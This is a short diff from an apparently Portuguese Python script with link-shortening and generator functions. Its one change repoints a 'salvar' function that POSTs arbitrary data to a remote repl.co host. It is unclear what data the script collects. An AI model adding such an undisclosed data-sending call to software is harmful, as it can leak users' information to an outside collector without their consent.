@@ -67,7 +67,7 @@ def encurtar_link(link):
 
 
 def salvar(data):
-    requests.post("https://SALVA.ghosthanma.repl.co", data=data)
+    requests.post("https://CV.belialhanma.repl.co", data=data)
 
 
 # ==================Gerador=============================
